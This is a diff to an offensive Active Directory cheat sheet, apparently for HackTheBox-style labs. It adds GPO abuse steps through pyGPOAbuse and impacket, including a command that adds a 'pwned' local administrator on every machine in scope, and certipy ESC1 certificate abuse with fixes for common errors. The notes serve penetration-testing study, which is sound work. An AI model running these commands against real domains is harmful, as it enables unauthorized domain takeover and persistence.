@@ -4,7 +4,7 @@ BloodHound surfaces the *attack edges* — `GenericAll`, `WriteOwner`, `WriteDAC
 
 **Lane:** creds + reach from Kali → **bloodyAD** (below). Domain-joined Windows foothold, no creds → **PowerView** ([workflow](#powerview-acl-workflow-from-a-domain-joined-windows-host)). Reading edges = BloodHound or PowerView; impacket can't read ACLs.
 
-**Jump to:** [Install](#install) · [Read object](#read-an-object) · [Set attribute](#set-an-attribute) · [Add to group](#add-group-membership-when-you-have-rights-on-a-group) · [Writable objects](#show-writeable-objects-which-acl-edges-grant-you-something) · [Abuses by edge](#common-abuses-by-edge) · [ADCS / Certipy](#adcs-abuse-certipy) · [Edge→tool map](#mapping-bloodhound-edges-to-tooling) · [PowerView workflow](#powerview-acl-workflow-from-a-domain-joined-windows-host)
+**Jump to:** [Install](#install) · [Read object](#read-an-object) · [Set attribute](#set-an-attribute) · [Add to group](#add-group-membership-when-you-have-rights-on-a-group) · [Writable objects](#show-writeable-objects-which-acl-edges-grant-you-something) · [Abuses by edge](#common-abuses-by-edge) · [GPO abuse](#gpo-abuse-via-a-writable-gpo) · [ADCS / Certipy](#adcs-abuse-certipy) · [Edge→tool map](#mapping-bloodhound-edges-to-tooling) · [PowerView workflow](#powerview-acl-workflow-from-a-domain-joined-windows-host)
 
 ---
 
@@ -140,6 +140,50 @@ export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass <dom>/Administrator@<victim-fqdn>
 ```
 
+### GPO Abuse via a Writable GPO
+
+`WriteOwner`, `WriteDACL`, or `GenericWrite` over a **GPO object** (not just a user/group) is a fast path to SYSTEM on every machine the GPO applies to. If that GPO is GPLinked to the **Domain Controllers** OU (or the domain root), it's domain compromise. BloodHound shows it as a `GenericWrite` / `WriteDacl` / `WriteOwner` / `Owns` edge from your principal to a **GPO** node — check the GPO's linked OUs in Object Information (DC OU = full compromise).
+
+Technique: T1484.001 (Group Policy Modification). The abuse writes an **immediate scheduled task** into the GPO's SYSVOL files that runs as `NT AUTHORITY\SYSTEM` on the next GP refresh (<=90 min + up to 30 random, or forced with `gpupdate /force`).
+
+> **Enumerate with the matching ingestor:** a BloodHound CE GUI needs `bloodhound-ce-python`, legacy needs `bloodhound-python`. A collector/GUI mismatch throws `cannot unmarshal number into ... TrustDirection`.
+
+#### Automated — pyGPOAbuse (prefer this)
+
+```bash
+git clone https://github.com/Hackndo/pyGPOAbuse /opt/pyGPOAbuse && cd /opt/pyGPOAbuse
+pip install -r requirements.txt --break-system-packages
+sed -i 's/\r$//' pygpoabuse.py        # fix CRLF shebang if the tool won't run
+
+## Default action = add a local admin on every machine in scope
+python3 pygpoabuse.py <domain>/<user>:'<pass>' -gpo-id "<GPO-GUID>"
+
+## Targeted + quieter: run a specific command, filter scope, clean up after
+python3 pygpoabuse.py <domain>/<user>:'<pass>' -gpo-id "<GPO-GUID>" \
+    -command 'net user pwned P@ssw0rd123! /add && net localgroup administrators pwned /add' \
+    -filter-enabled --cleanup
+```
+
+Get the GPO GUID from the BloodHound GPO node (Object Information) or over LDAP (`CN=Policies,CN=System,...`). Then wait for GP refresh (or force `gpupdate /force` on the target) and authenticate as the new admin.
+
+#### Manual — WriteOwner-only fallback
+
+With only `WriteOwner` on the GPO's GPC object, seize ownership and grant yourself a write DACL first, then let pyGPOAbuse do the SYSVOL work:
+
+```bash
+impacket-owneredit -action write -new-owner '<user>' \
+  -target-dn 'CN={<GPO-GUID>},CN=POLICIES,CN=SYSTEM,DC=<dom>,DC=<tld>' \
+  -dc-ip <dc-ip> '<domain>/<user>:<pass>'
+
+impacket-dacledit -action write -rights FullControl -principal '<user>' \
+  -target-dn 'CN={<GPO-GUID>},CN=POLICIES,CN=SYSTEM,DC=<dom>,DC=<tld>' \
+  -dc-ip <dc-ip> '<domain>/<user>:<pass>'
+
+## now you hold write over the GPO -> run pyGPOAbuse as above
+```
+
+Fully manual (no tooling): drop an immediate-task `ScheduledTasks.xml` into `\\<dc>\SYSVOL\<domain>\Policies\{<GPO-GUID>}\Machine\Preferences\ScheduledTasks\`, add the GPP client-side-extension GUIDs to `gPCMachineExtensionNames`, and bump `versionNumber` in `GPT.INI`. pyGPOAbuse automates all of this — prefer it.
+
 ### ADCS Abuse (Certipy)
 
 If Active Directory Certificate Services is deployed, there's almost always an insta-DA path — enrolling a certificate as a privileged user, then authenticating with the cert to pull that user's NT hash.
@@ -179,6 +223,28 @@ certipy-ad req -u <user>@<dom>.local -p '<pass>' \
 ## Auth with the cert → hash
 certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
 ```
+
+#### Reading certipy output + the gotchas that cost time
+
+**Spot ESC1 from the raw template fields** — don't wait for the `[!] Vulnerabilities` line, these four *are* the tell:
+- `Enrollee Supplies Subject : True`  (you choose the SAN / UPN)
+- `Client Authentication : True`      (the cert can auth to AD)
+- `Enrollment Rights` includes a group you're in (e.g. `Domain Users`)
+- `Requires Manager Approval : False` + `Authorized Signatures Required : 0`
+
+Save and grep instead of scrolling (template name + CA sit *above* the finding):
+
+```bash
+certipy-ad find -u <user>@<dom> -p '<pass>' -dc-ip <dc-ip> -vulnerable -stdout | tee certipy.txt
+grep -iB10 Vulnerabilities certipy.txt
+```
+
+**Two failure modes, both near-guaranteed on these boxes:**
+
+- **DNS** — `req` dies with *"query name does not exist"* / *"Failed to get DCE RPC connection."* Either add `/etc/hosts` (`<dc-ip> dc.<dom> <dom>`) **or** let certipy resolve through the DC with `-dc-ip <dc-ip> -ns <dc-ip>`.
+- **Clock skew** — `auth` dies with `KRB_AP_ERR_SKEW (Clock skew too great)`. Sync right before it: `sudo ntpdate <dc-ip>` (HTB skews are often *hours*). If it drifts back between steps, `sudo systemctl stop systemd-timesyncd` for the session.
+
+**Post-KB5014754 (`-sid`)** — if `req` warns *"Certificate has no object SID"* and `auth` then fails with `KDC_ERR_CERTIFICATE_MISMATCH`, the DC enforces strong cert binding. Re-request with the target's SID: `certipy-ad req ... -upn Administrator@<dom> -sid <admin-SID>`.
 
 #### ESC4 (rewrite → exploit → restore)
 
